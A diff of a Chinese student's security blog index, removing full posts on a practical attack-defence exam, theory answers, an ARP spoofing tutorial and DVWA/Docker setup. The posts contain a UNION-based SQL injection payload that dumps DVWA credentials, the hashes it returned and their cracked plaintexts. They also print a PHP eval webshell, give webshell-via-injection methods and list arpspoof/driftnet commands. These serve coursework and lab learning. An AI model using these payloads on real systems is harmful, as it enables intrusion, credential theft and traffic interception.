-<h3 id="4-列举出其它DVWA中所有用户名和密码，以明文显示；-admin-password"><a href="#4-列举出其它DVWA中所有用户名和密码，以明文显示；-admin-password" class="headerlink" title="4.列举出其它DVWA中所有用户名和密码，以明文显示；(admin:password)"></a>4.列举出其它DVWA中所有用户名和密码，以明文显示；(admin:password)</h3><h4 id="利用SQL注入-获取dvwa的所有用户名和密码"><a href="#利用SQL注入-获取dvwa的所有用户名和密码" class="headerlink" title="利用SQL注入 获取dvwa的所有用户名和密码"></a>利用SQL注入 获取dvwa的所有用户名和密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select group_concat(user,&apos;:&apos;,password),2 from users#</span><br></pre></td></tr></table></figure>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-d5bc838c083f89a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="sql注入"><br><strong>获得的用户名和密码</strong><br>admin:5f4dcc3b5aa765d61d8327deb882cf99,<br>infor2:432f45b44c432414d2f97df0e5743818,<br>security2:ef06bfe41161fb7c8cc288ec519a5c73,<br>xjxy2:d3ced152c98e10d7e2835308a72ec585,<br>lisi:133ff1e10a8b244767ef734fb86f37fd<br><strong>解md5</strong><br>（老师让明文显示，我不太清楚可不可以注入时就用命令解密，然后我是一个个解密的）<br>admin:password<br>infor2:12345678910<br>security2:5845211314<br>xjxy2:yahoo.com.cn<br>lisi:buzhidao</p>
-<h3 id="5-在network数据库中建立一个以自己“学号”为名的数据表；（使用mysql-login模块）"><a href="#5-在network数据库中建立一个以自己“学号”为名的数据表；（使用mysql-login模块）" class="headerlink" title="5.在network数据库中建立一个以自己“学号”为名的数据表；（使用mysql_login模块）"></a>5.在network数据库中建立一个以自己“学号”为名的数据表；（使用mysql_login模块）</h3><p> 这个模块之前没有用过（还是因为自己太菜o(*T▽T)ツ┏━┓[拍桌狂哭!]   ）<br>准备等所有考试都结束之后，去好好研究一下</p>
-<h3 id="6-流量分析题1：攻击者IP是多少？"><a href="#6-流量分析题1：攻击者IP是多少？" class="headerlink" title="6.流量分析题1：攻击者IP是多少？"></a>6.流量分析题1：攻击者IP是多少？</h3><p><img src="http://upload-images.jianshu.io/upload_images/10976729-21d4271ba431fe96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="攻击者IP"><br>202.1.1.2访问了ad_admin.php ，攻击者IP应该是<strong>202.1.1.2</strong></p>
-<h3 id="7-流量分析题2：后台写入的Webshell内容是什么？"><a href="#7-流量分析题2：后台写入的Webshell内容是什么？" class="headerlink" title="7.流量分析题2：后台写入的Webshell内容是什么？"></a>7.流量分析题2：后台写入的Webshell内容是什么？</h3><p>攻击者IP：202.1.1.2    过滤202.1.1.2的http请求<br><img src="http://upload-images.jianshu.io/upload_images/10976729-82c940af27ae4ce5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据包过滤"><br><img src="http://upload-images.jianshu.io/upload_images/10976729-a3e045708c97c160.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="后台写入的webshell"><br>Base64解密<br><img src="http://upload-images.jianshu.io/upload_images/10976729-d82cec5fa7956b6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="base64解密"><br>Webshell是<strong>&lt;?php eval($_POST[‘cmd’]);&gt;</strong></p>
-<h3 id="8-流量分析题3：黑客第一个上传的php文件名是什么？"><a href="#8-流量分析题3：黑客第一个上传的php文件名是什么？" class="headerlink" title="8.流量分析题3：黑客第一个上传的php文件名是什么？"></a>8.流量分析题3：黑客第一个上传的php文件名是什么？</h3><p>过滤数据包  找攻击者post到网站的木马文件<br><img src="http://upload-images.jianshu.io/upload_images/10976729-d9e84e9b327939c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="过滤数据包"><br><img src="http://upload-images.jianshu.io/upload_images/10976729-c63e9697bfc986b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="黑客上传的木马"><br>上传的第一个PHP文件名<strong>scan.php</strong></p>
-<h3 id="9-流量分析题4：黑客下载的数据库备份文件名是什么？"><a href="#9-流量分析题4：黑客下载的数据库备份文件名是什么？" class="headerlink" title="9.流量分析题4：黑客下载的数据库备份文件名是什么？"></a>9.流量分析题4：黑客下载的数据库备份文件名是什么？</h3><p>过滤攻击者202.1.1.2的http请求    找黑客下载的zip的包<br><img src="http://upload-images.jianshu.io/upload_images/10976729-092a8c5202b214f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="过滤数据包"><br><img src="http://upload-images.jianshu.io/upload_images/10976729-50c4f09fd23b9424.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="黑客下载的zip"></p>
-<p>（最后说一下，老师给的数据分析题，是铁三赛原题 ( ≖‿≖)  (￣▽￣)~*    ）</p>
-
-          
+          网络攻防期末考（实战）0x01 题目
+0x02 操作讲真的   想不到老师这么皮    老师给的环境是dvwa的    然后我一看是dvwa的，就以为直接按dvwa的那些来做就行，就没有信息收集。。。。。然鹅，我方了，最后才知道老师有另一个网站，去拿那个网站才能拿服务器，拿dvwa的根本弄不到服务器
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/05/网络攻防期末考(实战)/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -803,7 +861,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/04/2018-07-04-网络攻防期末考(理论)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/04/网络攻防期末考(理论)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="句末">
@@ -822,7 +880,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/07/04/2018-07-04-网络攻防期末考(理论)/" itemprop="url">网络攻防期末考（理论）</a></h1>
+                <a class="post-title-link" href="/2018/07/04/网络攻防期末考(理论)/" itemprop="url">网络攻防期末考（理论）</a></h1>
         
 
         <div class="post-meta">
@@ -896,54 +954,17 @@
       
         
           
-            <p>（一直蒟蒻的小萌新 ╮(╯▽╰)╭）</p>
-<p><strong>1.什么是端口扫描？</strong></p>
-<p>端口扫描是指某些别有用心的人发送一组端口扫描消息，试图以此侵入某台计算机，并了解其提供的计算机网络服务类型（这些网络服务均与<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7" target="_blank" rel="noopener">端口号</a>相关）。就是用端口扫描软件（superscan等）扫描远程计算机开放了哪些端口，一般一个端口对应一种服务。端口扫描是计算机解密高手喜欢的一种方式。攻击者可以通过它了解到从哪里可探寻到攻击弱点。实质上，端口扫描包括向每个端口发送消息，一次只发送一个消息。接收到的回应类型表示是否在使用该端口并且可由此探寻弱点。</p>
-<p>网络访问主要是通过TCP（传输控制协议）和UDP（用户数据报协议）这两个TCP/IP协议族的协议完成的。而网络服务器上运行的众多网络服务（Services）也是通过TCP端口（port）号和UDP端口号（16位的正整数）来识别的，比如FTP（文件传输协议）服务器的TCP端口号是21、Telnet（远程登陆协议）服务器的TCP端口号是23、DNS（域名解析服务）的UDP端口号是14。部分主要服务同时支持TCP和UDP服务。为了方便记忆，这些协议的TCP端口号和UDP端口号也被定为相同的号码。功能多的端口扫描软件同时具备这两方面的扫描功能。端口扫描技术是一项自动探测本地和远程系统端口开放情况的策略及方法，它使系统用户了解系统目前向外界提供了哪些服务，从而为系统用户管理网络提供了一种手段。</p>
-<p><strong>2.什么是字典攻击？</strong></p>
-<p>字典式攻击，又名词典式攻击，是一种破解密码的方法。是指在破解密码或密钥时，逐一偿试用户自定义词典中的单词或短语的攻击方式。与暴力破解的区别是，暴力破解会逐一尝试所有可能的组合密码，而字典式攻击会使用一个预先定义好的单词列表（可能的密码）。</p>
-<p>实施一次字典攻击需要具备两个要素 。</p>
-<p>要素一是黑客了解认证方式（包括认证协议以及地址、端口等信息），如同小偷需要知道库房在哪儿，房门挂着的是大铜锁还是密码锁，甚至虹膜、指纹识别？拿着一串金属钥匙想打开生指纹识别锁显然不现实。<br> 要素二是黑客拥有比较全面的口令集，包含着各类常见的弱口令，或者目标系统经常出现的组合口令，或者目标系统曾经泄露的口令集。这样才有更多的尝试机会。通常一次字典攻击的实施还是很耗费时间的，特别是目标系统的口令不那么常见。</p>
-<p><strong>3. 信息安全的基本属性主要表现在哪几个方面?</strong></p>
-<p>1、保密性，保证信息为授权者享用而不泄漏给未经授权者。</p>
-<p>2、完整性，保证信息从真实的发信者传送到真实的收信者手中，传送过程中没有被非法用户添加、删除、替换等。</p>
-<p>3、可用性，保证信息和信息系统随时为授权者提供服务，保证合法用户对信息和资源的使用不会被不合理的拒绝。<br>4、可控性，出于国家和机构的利益和社会管理的需要，保证管理者能够对信息实施必要的控制管理，以对抗社会犯罪和外敌侵犯。<br>5、不可否认性，人们要为自己的信息行为负责，提供保证社会依法管理需要的公证、仲裁信息证据。</p>
-<p><strong>4.简述跨站脚本漏洞攻击的原理</strong></p>
-<p>XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。利用网站对用户的输入缺少充分的有效性检验和敏感词过滤的漏洞,输入攻击脚本,对浏览该网站的客户端实施攻击。论坛、留言板较容易导致XSS攻击。</p>
-<p>原理：1、攻击者对页面进行xss攻击</p>
-<p>2、受害者浏览网页</p>
-<p>3、恶意代码被执行</p>
-<p>4、受害者浏览攻击者恶意网页</p>
-<p>5、攻击者发出恶意信息</p>
-<p>6、受害者发送敏感信息</p>
-<p><strong>5.简述暴力攻击的原理</strong></p>
-<p>暴力攻击是一种使用穷举法破译密码等信息的方法。 黑客使用枚举的方法，使用运算能力较强的计算机，尝试每种可能的字符破解密码，这些字符包括大小写、数字和通配符等。</p>
-<p>字典文件为暴力破解提供了一条捷径程序首先通过扫描得到系统的用户,然后利用字典中每一个密码来登录系统, 看是否成功,如果成功则显示密码。</p>
-<p><strong>6.简述社会工程学攻击的原理</strong></p>
-<p>社会工程是使用计谋和假情报去获得密码和其他敏感信息的科学。研究-一个站点的策略就是尽可能多地了解这个组织的个体，因此黑客不断试图寻找更加精妙的方法从他们希望渗透的组织那里获得信息。<br> 另一种社会工程的形式是黑客试图通过混淆-一个计算机系统去模拟一个合法用。</p>
-<p><strong>7.简述端口扫描技术的原理</strong></p>
-<p>端口扫描向目标主机的TCP/IP服务端口发送探测数据包，并记录目标主机的响应。通过分析响应来判断服务端口是打开还是关闭，就可以得知端口提供的服务或信息。端口扫描也可以通过捕获本地主机或服务器的流入流出IP数据包来监视本地</p>
-<p>主机的运行情况，它仅能对接收到的数据进行分析，帮助我们发现目标主机的某些内在的弱点，而不会提供进入一个系统的详细步骤。</p>
-<p><strong>8.简单描述SQL注入攻击</strong></p>
-<p>SQL注入原理：</p>
-<p>当攻击者发送的sql语句被sql解释器执行，通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄露。</p>
-<p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
-<p>攻击的目的只有一个，就是为了绕过程序限制，使用户输入的数据带入数据库中执行，利用数据库的特殊性获取更多的信息或更多的权限。</p>
-<p>基本原理：</p>
-<p>①攻击者访问有SQL注入漏洞的网站，寻找注入点</p>
-<p>②攻击者构造注入语句，注入语句和程序中的SQL语句结合生成新的sql语句</p>
-<p>③新的sql语句被提交到数据库中进行处理</p>
-<p>④数据库执行了新的SQL语句，引发SQL注入攻击</p>
-<p><strong>9.发现demo.jsp?uid=110注入点，你有哪几种思路获取webshell，哪种是优选</strong></p>
-<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell </p>
-<p>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 </p>
-<p>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
-<p><strong>10.简述Web安全目标及技术</strong></p>
-<p>Web安全目标是保护web服务器及其数据的安全、保护WEB服务器和用户之间传递信息的安全、保护终端用户计算机及其连入Internet的设备安全。Web安全技术主要包括:web服务器安全技术,web应用服务安全技术和web浏览安全技术</p>
-<hr>
-<p>（PS:这些答案来源与网络，老师说可以百度emmmmmm然后自己就没有动脑子，直接百度复制粘贴）</p>
-
-          
+          （一直蒟蒻的小萌新 ╮(╯▽╰)╭）
+1.什么是端口扫描？
+端口扫描是指某些别有用心的人发送一组端口扫描消息，试图以此侵入某台计算机，并了解其提供的计算机网络服务类型（这些网络服务均与端口号相关）。就是用端口扫描软件（superscan等）扫描远程计算机开放了哪些端口，一般一个端口对应一种服务。端口
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/04/网络攻防期末考(理论)/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -990,7 +1011,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/01/2018-07-01-ARP攻击（Arpspoof）/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/01/ARP攻击（Arpspoof）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="句末">
@@ -1009,7 +1030,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/07/01/2018-07-01-ARP攻击（Arpspoof）/" itemprop="url">ARP攻击（Arpspoof）</a></h1>
+                <a class="post-title-link" href="/2018/07/01/ARP攻击（Arpspoof）/" itemprop="url">ARP攻击（Arpspoof）</a></h1>
         
 
         <div class="post-meta">
@@ -1083,34 +1104,17 @@
       
         
           
-            <p>（一枚时常文艺一下的贼皮理工科小萌新，欢迎大佬指点， ( ≖‿≖)嗷<del>）<br>~~这个月的文章还没有写</del>emmm好吧，过了12点，已经是新的一月了，害pia被老大骂，所以现在赶紧写文章（PS：老大求饶命）</p>
-<hr>
-<p>ARP即地址地址解析协议，即ARP协议通过IP地址来查找主机的MAC地址，把IP地址转换为MAC地址。ARP攻击又称为中间人攻击，是一种在局域网中常用的攻击手段。</p>
-<h3 id="ARP断网攻击"><a href="#ARP断网攻击" class="headerlink" title="ARP断网攻击"></a>ARP断网攻击</h3><p>在实验之前我们首先要知道ARP断网攻击是局域网攻击，我们要保证目标主机必须和自己处于一个局域网内，且自己和目标主机网络应该是通的</p>
-<p>在ARP断网攻击之前 ，我们先用fping探测该局域网中的存活地址</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-5936dc197ceba3f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fping探测局域网存活地址"></p>
-<p>探测到的存活地址，就是我们的目标主机</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-ce35d459d6c3edca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="目标主机ip"><br>我们在攻击之前先看一下目标机的arp缓存<br><img src="http://upload-images.jianshu.io/upload_images/10976729-58989fd6322eaf05.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="攻击前目标机arp缓存"><br><img src="http://upload-images.jianshu.io/upload_images/10976729-fd0a135f3dafaea1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="目标主机网络正常"></p>
-<p>目标主机能ping通百度，说明目标主机的网络环境没问题，下面我们开始断网攻击，用到的是kali里面的一个工具，arpspoof</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof   -i   网卡   -t    目标IP    网关</span><br></pre></td></tr></table></figure>
-<p>在攻击之前，目标主机的网络是通的，攻击成功后，目标主机断网“请求超时”</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-cb8598870682cb4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="攻击成功"></p>
-<p>在攻击结束后，目标主机网络恢复</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-2ddf19771ff82f66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="停止攻击"></p>
-<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>ARP欺骗，是让目标主机的流量经过主机的网卡，再从网关出去，而网关也会把原本流入目标机的流量经过我。</p>
-<p>在进行arp欺骗之前，我们要先开启本机的IP转发功能，如果不开启的话，我们攻击之后会使目标机断网，而不是欺骗。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-4ddc5e05effb7581.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="开启IP转发"></p>
-<p>下面我们开始对目标主机进行欺骗</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡 -t 目标IP 网关</span><br></pre></td></tr></table></figure>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-0266d37b850fa969.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ARP欺骗"></p>
-<p>我们用图片嗅探工具driftnet来捕获目标主机查看的图片</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
-<p>因为我们欺骗目标机，使目标机的流量经过自己的网卡，所以这里我们嗅探自己的网卡，下图成功ARP欺骗</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-f151e610777f6be9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="攻击机图片嗅探"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-3626b28ecda3c4b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="目标机"><br>下图是攻击后目标机的arp缓存<br><img src="http://upload-images.jianshu.io/upload_images/10976729-38a0cd9f45ea3063.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="攻击后arp缓存"></p>
-<p>emmmmm  就先到这里吧  一晚上没睡好 饭也没吃，肚子咕咕叫，先觅食去~</p>
+          （一枚时常文艺一下的贼皮理工科小萌新，欢迎大佬指点， ( ≖‿≖)嗷）~~这个月的文章还没有写emmm好吧，过了12点，已经是新的一月了，害pia被老大骂，所以现在赶紧写文章（PS：老大求饶命）
 
-          
+ARP即地址地址解析协议，即ARP协议通过IP地址来查找主机的MAC地址，把IP地址转换为MAC地址。
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/01/ARP攻击（Arpspoof）/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1157,7 +1161,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/27/2018-05-27-docker搭建DVWA/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/27/docker搭建DVWA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="句末">
@@ -1176,7 +1180,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/05/27/2018-05-27-docker搭建DVWA/" itemprop="url">docker搭建DVWA</a></h1>
+                <a class="post-title-link" href="/2018/05/27/docker搭建DVWA/" itemprop="url">docker搭建DVWA</a></h1>
         
 
         <div class="post-meta">
@@ -1250,15 +1254,17 @@
       
         
           
-            <h1 id="1-先创建一个新的容器"><a href="#1-先创建一个新的容器" class="headerlink" title="1. 先创建一个新的容器"></a>1. 先创建一个新的容器</h1><p>在创建容器时，会自动获取一个容器id，对于每个容器他的id都是唯一的<img src="http://upload-images.jianshu.io/upload_images/10976729-33ca24294a10a8d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建容器"></p>
-<h1 id="2-进入正在运行的容器"><a href="#2-进入正在运行的容器" class="headerlink" title="2. 进入正在运行的容器"></a>2. 进入正在运行的容器</h1><p><code>sudo docker exec -it id /bin/bash</code><br>id是创建容器时自动获取的，可以通过id对容器进行操作，也可以通过容器的名字操作容器<img src="http://upload-images.jianshu.io/upload_images/10976729-8d092dbe221d4ab5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="进入容器"></p>
-<h1 id="3-Lamp（web应用软件组合）"><a href="#3-Lamp（web应用软件组合）" class="headerlink" title="3. Lamp（web应用软件组合）"></a>3. Lamp（web应用软件组合）</h1><h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><p>1.安装apache<br><code>apt-get install apache2</code><br><img src="http://upload-images.jianshu.io/upload_images/10976729-85202f2631383509.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安装apache"><br>2.启动apache<br><code>service apache2 start</code><br><img src="http://upload-images.jianshu.io/upload_images/10976729-df4e34dab4d4992e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="启动apache"><br>3.测试apache<br><img src="http://upload-images.jianshu.io/upload_images/10976729-8ac7325e3462bff9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="apache"></p>
-<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>安装mysql<br><code>apt-get install mysql-server mysql-client</code><br>mysql-server是服务，mysql-client通过模块操作数据库<img src="http://upload-images.jianshu.io/upload_images/10976729-ca0f9251c6608530.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安装mysql"></p>
-<h2 id="PHP（一种脚本语言）"><a href="#PHP（一种脚本语言）" class="headerlink" title="PHP（一种脚本语言）"></a>PHP（一种脚本语言）</h2><p>1.安装PHP和一些包<br><code>apt-get install php7.2</code><br>因为Ubuntu是自带PHP的相关文件的，建议安装的时候看一下自带的php的相关文件的版本，然后直接安装那个版本比较方便，然后我用的Ubuntu是18.04，php是7.2<br><img src="http://upload-images.jianshu.io/upload_images/10976729-097aceeeb3a987b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安装php"><br>2.测试php<br>在/var/www/html这个目录下我写了一个phpinfo();的1.php文件来测试php是否正常，然后重新启动一下apache，然后通过浏览器访问了一下1.php<br><img src="http://upload-images.jianshu.io/upload_images/10976729-6e46b5050fbb6888.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试php"><br>3.访问1.php页面正常显示<br><img src="http://upload-images.jianshu.io/upload_images/10976729-dda9f03f90c20400.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="访问1.php"></p>
-<h1 id="4-下载dvwa并部署到apache"><a href="#4-下载dvwa并部署到apache" class="headerlink" title="4. 下载dvwa并部署到apache"></a>4. 下载dvwa并部署到apache</h1><p>用到的一些命令需要安装，如wget，unzip<br><img src="http://upload-images.jianshu.io/upload_images/10976729-8927af5a9ffd9904.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="从GitHub上下载dvwa"><br>1.下载的dvwa<br><img src="http://upload-images.jianshu.io/upload_images/10976729-a5e464942fd7b316.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="dvwa的压缩文件"><br>2.部署到apache<br><img src="http://upload-images.jianshu.io/upload_images/10976729-b94b4d9b7df4627c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="部署dvwa"><br>3.通过浏览器访问<br><img src="http://upload-images.jianshu.io/upload_images/10976729-91c523ec3807422a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置前"></p>
-<h1 id="5-配置完成后dvwa"><a href="#5-配置完成后dvwa" class="headerlink" title="5.配置完成后dvwa"></a>5.配置完成后dvwa</h1><p><img src="http://upload-images.jianshu.io/upload_images/10976729-23b49dfcddc2b486.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="dvwa"></p>
-
-          
+          1. 先创建一个新的容器在创建容器时，会自动获取一个容器id，对于每个容器他的id都是唯一的
+2. 进入正在运行的容器sudo docker exec -it id /bin/bashid是创建容器时自动获取的，可以通过id对容器进行操作，也可以通过容器的名字操作容器
+3. Lamp（web应用软件
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/27/docker搭建DVWA/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1398,13 +1404,18 @@
       
         
           
-            <h1 id="docker是什么"><a href="#docker是什么" class="headerlink" title="docker是什么"></a>docker是什么</h1><ol>
-<li>Docker和虚拟机的功能差不多，可以看作一个轻量级的虚拟机，但是docker不是虚拟机。docker比虚拟机节省内存，启动更快，性能开销极低。</li>
-<li>Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源。</li>
-<li>Docker完全使用沙箱机制，相互之间不会有任何接口。<h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1>1.Ubuntu<br>2.CentOS<br>3.Windows<br>4.MacOS<br>5.Cloud<h1 id="Docker安装的一些注意事项"><a href="#Docker安装的一些注意事项" class="headerlink" title="Docker安装的一些注意事项"></a>Docker安装的一些注意事项</h1>1.ubuntu的内核版本必须高于3.8（如果版本低的话就先更新一下）<br>2.安装的时候建议转到root下（不然好多东西报错）<br>3.启动docker的时候一定要sudo，哪怕是root用户也要sudo，不然启动不起来<br>4.该docker守护程序绑定到一个Unix套接字而不是TCP端口。默认情况下，Unix套接字由root用户拥有，其他用户只能使用sudo来访问它。该docker守护进程始终运行在root用户。<h1 id="Docker的一些常用命令"><a href="#Docker的一些常用命令" class="headerlink" title="Docker的一些常用命令"></a>Docker的一些常用命令</h1><h2 id="1-启动docker"><a href="#1-启动docker" class="headerlink" title="1.启动docker"></a>1.启动docker</h2><code>service docker start</code><br>docker需要在root用户下才能跑起来（但是我用ubuntu14.04启动docker的时候发现在root用户下启动不起来，必须用sudo命令才能启动，但是在ubuntu16.04版本下没有这个问题）<br><img src="http://upload-images.jianshu.io/upload_images/10976729-e76cd810309827b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ubuntu14.04下启动docker"><h2 id="2-列出机器上的镜像"><a href="#2-列出机器上的镜像" class="headerlink" title="2.列出机器上的镜像"></a>2.列出机器上的镜像</h2><code>Docker images</code><br><img src="http://upload-images.jianshu.io/upload_images/10976729-8c56da257132226b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="docker images"><h2 id="3-查看所有启动的容器（加参数-a显示所有容器）"><a href="#3-查看所有启动的容器（加参数-a显示所有容器）" class="headerlink" title="3.查看所有启动的容器（加参数-a显示所有容器）"></a>3.查看所有启动的容器（加参数-a显示所有容器）</h2><code>Docker ps</code><br><img src="http://upload-images.jianshu.io/upload_images/10976729-c4fe40d975c0dfcf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="查看容器"><h2 id="4-查找镜像（如ubuntu镜像）"><a href="#4-查找镜像（如ubuntu镜像）" class="headerlink" title="4.查找镜像（如ubuntu镜像）"></a>4.查找镜像（如ubuntu镜像）</h2>1.可以通过docker search命令来查找镜像<br><code>Docker search ubuntu</code><br><img src="http://upload-images.jianshu.io/upload_images/10976729-c15adba998a3e309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="查找镜像"><br>2.也可以从网站搜索镜像（docker hub，github上都有很多镜像，需要的可以从上面找）<h2 id="5-创建一个新的容器"><a href="#5-创建一个新的容器" class="headerlink" title="5.创建一个新的容器"></a>5.创建一个新的容器</h2><code>sudo docker run -it -d --name test -p 80:80 ubuntu</code><br>创建容器的时候自动获取一个id，这个id是唯一的，可以通过id对这个容器进行操作。<br>-d参数为后台运行。<br>–name参数为自定义容器名。<br>-p参数为指定端口映射，后者为容器的端口。<h2 id="6-进入一个启动的容器"><a href="#6-进入一个启动的容器" class="headerlink" title="6.进入一个启动的容器"></a>6.进入一个启动的容器</h2>sudo docker exec -it id /bin/bash<br>id为创建容器时获取的id，可以通过他对容器操作<br><img src="http://upload-images.jianshu.io/upload_images/10976729-50fcaa383fdcddee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="启动容器"></li>
-</ol>
-
-          
+          docker是什么
+Docker和虚拟机的功能差不多，可以看作一个轻量级的虚拟机，但是docker不是虚拟机。docker比虚拟机节省内存，启动更快，性能开销极低。
+Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源。
+Docker完全使用沙箱机制，相互之间不会有
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/27/docker/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1451,7 +1462,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/07/Linux_8_硬盘分区/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/28/MD5之守株待兔-WP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="句末">
@@ -1470,7 +1481,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/05/07/Linux_8_硬盘分区/" itemprop="url">Linux_8_硬盘分区</a></h1>
